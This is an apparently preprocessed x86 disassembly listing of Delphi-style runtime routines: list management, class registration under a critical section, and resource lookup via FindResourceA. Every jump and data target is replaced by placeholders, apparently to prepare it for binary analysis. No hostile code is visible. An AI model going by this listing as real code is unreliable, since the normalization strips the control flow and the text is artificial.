cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413d6c
mov edx edi
call sub_412d48
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413d6c
mov edx edi
call sub_412d48
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413c5c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412d48
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413c5c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412e0c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413d6c
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412c44
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412e58
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412b28
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413c10
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_412ecc
push ebx
push esi
push edi
push ebp
call sub_403490
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403478
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413d6c
call sub_403104
inc edi
dec ebp
jne r-xdata
sub_412f28
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413d6c
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412ab8
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412f6c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412be4
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413d6c
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412fb0
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_413033
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403054
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41303a
lea eax [ ebp - 0x10c ]
call sub_403e54
retn
sub_413040
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412f28
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412a4c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412fb0
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413d6c
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413d6c
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403330
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412f28
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413c5c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413c10
sub_41312c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413d6c
mov edx ebp
call sub_412d30
test al al
jne r-xdata
sub_413170
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412b28
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413c10
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413d6c
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413dc8
test eax eax
jge r-xdata
sub_4131cc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413d6c
mov esi eax
mov edx ebp
mov eax esi
call sub_412d68
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403104
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413c5c
sub_41321c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_41331b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403428
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413322
mov eax [ rw-data ]
call sub_4131c0
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413c10
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413d6c
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412c44
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413c10
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413d6c
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_413322
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_413348
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_413378
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_413108
xor edx edx
push ebp
push sub_4133ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4131c0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_40393c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413d6c
mov edx [ ebp - 0x4 ]
call sub_412be4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41340c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41346c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413473
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_413478
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_4134be
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412f6c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4134c5
mov eax [ rw-data ]
call sub_4131c0
retn
sub_4134cc
push ebx
push esi
mov esi eax
mov eax esi
call sub_413478
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_41340c
sub_4134ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_413551
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41312c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413114
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413558
mov eax [ rw-data ]
call sub_4131c0
retn
mov eax ebx
call sub_403090
mov ebx eax
sub_41355c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_41359e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4131cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135a5
mov eax [ rw-data ]
call sub_4131c0
retn
sub_4135a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_4135ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135f1
mov eax [ rw-data ]
call sub_4131c0
retn
sub_4135f4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_41363b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_413040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413642
mov eax [ rw-data ]
call sub_4131c0
retn
sub_413648
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_413108
xor eax eax
push ebp
push sub_413696
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412e0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41369d
mov eax [ rw-data ]
call sub_4131c0
retn
sub_4136fc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403428
pop ebp
retn 0x8
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_413734
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4136fc
mov edx eax
mov eax [ rw-data ]
call sub_414050
pop edi
pop esi
pop ebx
retn
sub_413760
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4140d8
mov esi eax
xor edx edx
push ebp
push sub_4137ca
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
mov edx ebx
mov eax esi
call sub_413d6c
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_40393c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4137dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407b44
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41381c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403ea8
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413860
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413dc8
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413c10
sub_4138b8
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413d6c
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4138f8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4138b8
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_41391c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404314
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416384
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413990
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415d54
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_4139a0
push ebx
call sub_405c24
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405c24
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413c10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov ebx eax
call sub_405c24
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov ebx eax
call sub_405c24
mov [ eax + 0xc ] ebx
sub_4139f8
push ebx
push esi
push edi
call sub_405c24
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413d6c
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413a28
push ebx
push esi
call sub_405c24
mov eax [ eax + 0x8 ]
call sub_403104
call sub_405c24
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413e54
mov esi eax
call sub_405c24
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413c5c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405c24
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403104
sub_413a84
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413b1a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b21
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403090
call sub_413a84
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403054
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040b8
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404ea0
call sub_404ef0
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_41391c
or bl al
sub_413b2c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413bda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413bbb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40304c
call sub_413a84
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4139a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413bc2
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4139f8
retn
call sub_413a28
sub_413bf0
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_413c10
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413c5c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413cf8
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_413d6c
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413cc0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413cbc
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
jmp sub_403890
sub_413cf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_413d40
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4059b8
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413cc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d47
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_413d6c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413cf8
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413d94
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413ed0
retn
sub_413dc8
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413de8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413cf8
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413e60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413cf8
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413eb0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413dc8
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413c5c
sub_413ed0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413cf8
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413f0c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413cf8
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413ed0
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b18
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
